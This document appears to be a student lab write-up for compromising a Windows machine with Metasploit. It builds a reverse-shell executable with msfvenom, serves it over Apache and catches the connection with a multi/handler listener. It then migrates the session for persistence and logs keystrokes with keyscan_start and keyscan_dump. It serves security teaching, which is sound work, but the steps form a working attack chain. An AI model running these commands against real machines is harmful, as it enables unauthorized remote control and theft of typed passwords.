# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM : 

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/fbb38fbc-fd8b-456a-b160-c3282a7487ec)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT: 

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/7f21b4e8-f284-4e4f-918f-ef1633be8ba5)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/aeb54f70-ddad-41e8-8bf1-468d818a79bf)


Start apache server sudo systemctl apache2 start

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/9852fc70-71ef-451f-804d-5dd11f980d51)


Check the status of apache2

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/908c4672-1ddb-4333-9201-9fdfe4553ffe)

Invoke msfconsole:


## OUTPUT :

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/3fb8850c-78e4-43e6-b016-2f42b4df3068)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.


![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/1ec25415-0c4b-44e9-852f-6eac991582dc)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/69387c62-e65b-48fc-ae72-2911354c474d)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted


![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/b5c342b5-fd0e-4a44-b776-7075973f798c)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/fc6637fa-8282-4870-b8a4-7c9a3ba1643e)


keyscan_dump Shows the keystrokes captured so far


![image](https://github.com/priya672003/Compromising-windows-using-Metasploit/assets/81132849/dd5d84b1-de44-4e23-82c3-594d54c9e654)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
